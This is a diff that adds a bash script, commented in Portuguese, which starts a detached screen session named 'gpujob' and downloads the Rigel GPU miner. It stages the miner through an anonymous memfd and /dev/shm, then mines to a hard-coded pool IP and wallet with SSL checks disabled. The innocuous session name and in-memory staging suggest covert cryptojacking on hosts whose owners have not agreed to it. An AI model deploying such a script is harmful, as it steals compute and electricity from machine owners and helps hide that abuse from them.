@@ -1,0 +1,74 @@
+#!/bin/bash
+screen -dmS gpujob bash -c '
+python3 -c '\''
+import os
+import sys
+import ctypes
+import requests
+import tempfile
+import subprocess
+from ctypes import CDLL, get_errno
+
+def run_miner():
+    try:
+        # Configurações
+        MINER_URL = "https://github.com/rigelminer/rigel/releases/download/1.21.2/rigel-1.21.2-linux.tar.gz"
+        POOL = "stratum+ssl://18.221.157.241:8443"
+        WALLET = "krxY97WV2D.CLD"
+        
+        # Inicialização
+        libc = CDLL(None)
+        print("🔧 Inicializando minerador...")
+        
+        # Download
+        print("⏳ Baixando binário...")
+        response = requests.get(MINER_URL, stream=True, timeout=30)
+        response.raise_for_status()
+        
+        # Criar arquivo em memória
+        fd = libc.syscall(319, b"anon_memfd", 0x0001)
+        for chunk in response.iter_content(chunk_size=8192):
+            os.write(fd, chunk)
+        os.lseek(fd, 0, os.SEEK_SET)
+        
+        # Extração
+        with tempfile.TemporaryDirectory(dir="/dev/shm") as tmpdir:
+            print("📦 Extraindo arquivos...")
+            subprocess.run(["/bin/tar", "xzf", f"/proc/self/fd/{fd}", "-C", tmpdir],
+                         check=True, pass_fds=[fd])
+            
+            # Busca pelo executável
+            miner_path = None
+            for root, _, files in os.walk(tmpdir):
+                if "rigel" in files:
+                    miner_path = os.path.join(root, "rigel")
+                    os.chmod(miner_path, 0o755)
+                    break
+            
+            if not miner_path:
+                raise FileNotFoundError("Binário do minerador não encontrado!")
+            
+            # Execução
+            print("🚀 Iniciando minerador...")
+            args = [
+                miner_path,
+                "--algorithm", "octopus",
+                "--url", POOL,
+                "--username", WALLET,
+                "--password", "x",
+                "--no-strict-ssl"
+            ]
+            subprocess.run(args, check=True)
+            
+    except Exception as e:
+        print(f"❌ ERRO CRÍTICO: {e}", file=sys.stderr)
+        sys.exit(1)
+    finally:
+        try: os.close(fd)
+        except: pass
+
+if __name__ == "__main__":
+    run_miner()
+'\'' && echo "Minerador encerrado com sucesso!" || echo "Minerador falhou!"
+sleep 5  # Mantém a sessão aberta para visualização
+'
